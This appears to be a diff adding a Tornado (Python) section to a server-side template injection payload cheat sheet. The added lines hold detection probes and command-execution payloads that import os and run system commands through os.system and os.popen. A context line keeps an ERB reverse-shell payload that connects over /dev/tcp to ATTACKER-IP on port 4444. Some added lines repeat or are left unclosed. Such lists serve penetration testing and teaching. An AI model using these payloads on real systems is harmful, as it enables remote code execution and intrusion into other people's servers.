@@ -63,6 +63,25 @@ ${7*7}
 | Reverse Shell | `<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'") %>` |
 
 ---
+## Tornado (Python)
+```
+{{7*7}} = 49
+${7*7} = ${7*7}
+{{foobar}} = Error
+{{7*'7'}} = 7777777
+
+{% raw %}
+{% import foobar %} = Error
+{% import os %}
+
+{% import os %}
+{% endraw %}
+{{os.system('whoami')}}
+{{os.system('whoami')}}
+{% import os %}{{ os.popen("whoami").read() }}
+{% import os %}{{os.system('pwd')
+
+```
 
 ## 🟢 Jinja2 (Python)
 
